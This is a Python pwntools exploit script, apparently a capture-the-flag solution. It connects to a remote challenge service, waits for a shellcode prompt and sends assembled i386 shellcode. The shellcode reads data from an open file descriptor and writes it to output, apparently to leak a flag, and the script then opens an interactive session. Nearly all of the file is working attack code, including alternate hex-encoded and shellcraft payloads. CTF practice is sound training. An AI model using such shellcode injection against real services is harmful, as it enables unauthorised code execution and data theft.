#!/usr/bin/python3

from binascii import unhexlify
from pwn import *

PROGRAM_NAME = "sh"
ENCODING = "ascii"
REMOTE = 0
OFFSET = 16

# https://stackoverflow.com/a/15704848
ROM_HELLO = b'\xeb\x19\x31\xc0\x31\xdb\x31\xd2\x31\xc9\xb0\x04\xb3\x01\x59\xb2\x05\xcd\x80\x31\xc0\xb0\x01\x31\xdb\xcd\x80\xe8\xe2\xff\xff\xff\x68\x65\x6c\x6c\x6f'

ROM_PWNHELLO = pwnlib.shellcraft.i386.linux.echo('pwny hello', 1)
ROM_MY = """
push 3
pop eax
        
push 0x3e8      
pop ebx

call get_eip
get_eip:
    pop ecx
add ecx, 0x100
push 0x32
pop edx
int    0x80           
	
push 4
pop eax
        
push 1
pop ebx        
int    0x80  
ret         
"""

  # pwnlib.shellcraft.i386.linux.readn(1000, 'eax', 'ebx')

rom = ROM_MY
#print(rom)
rom = asm(rom)

def io_beg():
	return remote('plzpwn.me', 3001)
	#process("./simple")
	#remote('plzpwn.me', 2000)
	#process('./jump')
	
def io_rdy(x):
	return x.recvuntil("enter your shellcode:".encode(ENCODING), timeout = 3).decode(ENCODING)

def main():
	print("**********WELCOME**********")
	stage = 0
	fin = 0
	
	while(fin < 1):
		if(stage == 0):
			io = io_beg()						
			io_rdy(io)
						
			print("1. Deploying ")
			io.send_raw(rom) # win
			print("2. Fire")
			io.sendline(b'') # fire!		
			
			io.interactive()
			
			stage = stage + 1
		else:
			print("Weird flex, exiting")
			fin = 1

if __name__ == '__main__':
	main()
